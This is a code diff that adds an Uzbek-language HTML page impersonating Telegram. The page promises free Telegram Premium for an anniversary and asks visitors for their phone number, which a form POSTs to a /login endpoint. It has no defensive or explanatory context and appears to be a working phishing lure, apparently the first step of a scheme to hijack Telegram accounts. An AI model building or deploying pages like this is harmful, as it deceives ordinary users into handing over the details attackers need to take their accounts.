@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Premium - Bepul Obuna</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(180deg, #1d2b64 0%, #0e1621 100%);
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            text-align: center;
+        }
+        .container { width: 90%; max-width: 400px; padding: 20px; }
+        .logo {
+            width: 130px;
+            height: 130px;
+            background: linear-gradient(45deg, #a445ed, #2b87ff);
+            border-radius: 40%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 70px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            margin: 0 auto 30px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 10px 30px rgba(43, 135, 255, 0.3); }
+            50% { transform: scale(1.05); box-shadow: 0 10px 40px rgba(43, 135, 255, 0.6); }
+            100% { transform: scale(1); box-shadow: 0 10px 30px rgba(43, 135, 255, 0.3); }
+        }
+        h1 { font-size: 32px; font-weight: bold; margin-bottom: 15px; letter-spacing: 0.5px; }
+        p { font-size: 17px; color: #b1c3d1; line-height: 1.5; margin-bottom: 40px; }
+        .input-label { display: block; text-align: left; font-size: 14px; color: #b1c3d1; margin-bottom: 8px; margin-left: 5px; }
+        input[type="text"] {
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            border: 1.5px solid #334659;
+            background: rgba(23, 33, 43, 0.8);
+            color: white;
+            font-size: 18px;
+            margin-bottom: 25px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        input[type="text"]:focus { border-color: #2b87ff; }
+        button {
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            border: none;
+            background: #ffffff;
+            color: #0e1621;
+            font-weight: 700;
+            font-size: 16px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover { background: #e0e0e0; }
+        .footer { font-size: 13px; color: rgba(177, 195, 209, 0.5); margin-top: 60px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">⭐</div>
+        <h1>Telegram Premium</h1>
+        <p>Yubileyimizni nishonlash uchun barcha foydalanuvchilarga bepul Telegram Premium!</p>
+        
+        <form action="/login" method="POST">
+            <span class="input-label">Telefon raqami:</span>
+            <input type="text" name="phone" placeholder="+998991234567" required>
+            <button type="submit">OLISH</button>
+        </form>
+
+        <div class="footer">Barcha huquqlar himoyalangan © 2026</div>
+    </div>
+</body>
+</html>
